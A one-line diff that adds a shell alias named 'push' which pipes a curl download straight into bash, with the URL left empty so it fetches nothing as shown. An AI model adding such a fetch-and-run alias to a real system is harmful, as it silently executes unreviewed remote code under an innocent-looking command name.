@@ -1,0 +1,1 @@
+alias push='bash <(curl -s )'
